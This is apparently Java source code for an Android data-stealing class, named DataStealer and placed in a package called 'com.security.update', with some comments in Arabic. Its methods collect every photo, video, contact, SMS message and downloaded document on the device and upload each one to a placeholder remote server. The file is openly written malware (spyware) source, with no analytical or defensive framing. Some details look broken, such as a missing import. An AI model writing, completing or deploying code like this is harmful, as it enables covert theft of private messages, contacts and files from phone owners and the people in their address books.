package com.security.update;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.MediaStore;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataStealer {
    private static final String TAG = "DataStealer";
    private static final String SERVER_URL = "http://yourserver.com/upload";
    
    public void stealPhotos() {
        try {
            String[] projection = { MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME };
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                    uploadFile(imagePath, "photos", fileName);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Photo stealing failed: " + e.getMessage());
        }
    }
    
    public void stealVideos() {
        try {
            String[] projection = { MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME };
            Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String videoPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                    String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                    uploadFile(videoPath, "videos", fileName);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Video stealing failed: " + e.getMessage());
        }
    }
    
    public void stealContacts() {
        try {
            StringBuilder contactsData = new StringBuilder();
            contactsData.append("Contacts stolen on: ").append(new Date()).append("\n\n");
            
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    // الحصول على أرقام الهاتف
                    Cursor phones = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId}, null
                    );
                    
                    String phoneNumbers = "";
                    if (phones != null) {
                        while (phones.moveToNext()) {
                            String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phoneNumbers += number + ", ";
                        }
                        phones.close();
                    }
                    
                    contactsData.append("Name: ").append(name).append(" | Phones: ").append(phoneNumbers).append("\n");
                }
                cursor.close();
            }
            
            // حفظ جهات الاتصال في ملف مؤقت ثم رفعه
            String tempFile = "/sdcard/contacts_backup.txt";
            FileOutputStream fos = new FileOutputStream(tempFile);
            fos.write(contactsData.toString().getBytes());
            fos.close();
            
            uploadFile(tempFile, "contacts", "contacts.txt");
            
        } catch (Exception e) {
            Log.e(TAG, "Contacts stealing failed: " + e.getMessage());
        }
    }
    
    public void stealSMS() {
        try {
            StringBuilder smsData = new StringBuilder();
            smsData.append("SMS messages stolen on: ").append(new Date()).append("\n\n");
            
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    
                    smsData.append("From: ").append(address)
                          .append(" | Date: ").append(date)
                          .append(" | Message: ").append(body).append("\n\n");
                }
                cursor.close();
            }
            
            // حفظ الرسائل في ملف مؤقت ثم رفعه
            String tempFile = "/sdcard/sms_backup.txt";
            FileOutputStream fos = new FileOutputStream(tempFile);
            fos.write(smsData.toString().getBytes());
            fos.close();
            
            uploadFile(tempFile, "sms", "sms_messages.txt");
            
        } catch (Exception e) {
            Log.e(TAG, "SMS stealing failed: " + e.getMessage());
        }
    }
    
    public void stealDocuments() {
        try {
            // سرقة ملفات PDF، Word، Excel، إلخ
            File downloadsDir = new File("/sdcard/Download");
            if (downloadsDir.exists()) {
                File[] files = downloadsDir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        String fileName = file.getName().toLowerCase();
                        if (fileName.endsWith(".pdf") || fileName.endsWith(".doc") || 
                            fileName.endsWith(".docx") || fileName.endsWith(".xls") || 
                            fileName.endsWith(".xlsx") || fileName.endsWith(".txt")) {
                            uploadFile(file.getAbsolutePath(), "documents", file.getName());
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Documents stealing failed: " + e.getMessage());
        }
    }
    
    private void uploadFile(String filePath, String type, String fileName) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            
            URL url = new URL(SERVER_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data");
            
            OutputStream os = connection.getOutputStream();
            FileInputStream fis = new FileInputStream(file);
            
            // كتابة بيانات النموذج
            String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            String lineEnd = "\r\n";
            
            os.write(("--" + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + lineEnd).getBytes());
            os.write(("Content-Type: application/octet-stream" + lineEnd + lineEnd).getBytes());
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            
            os.write((lineEnd + "--" + boundary + "--" + lineEnd).getBytes());
            
            fis.close();
            os.close();
            
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                Log.d(TAG, "File uploaded successfully: " + fileName);
            }
            
            connection.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "File upload failed: " + e.getMessage());
        }
    }
    
    private ContentResolver getContentResolver() {
        // نحتاج إلى Context للحصول على ContentResolver
        return android.app.AppGlobals.getInitialApplication().getContentResolver();
    }
                      }
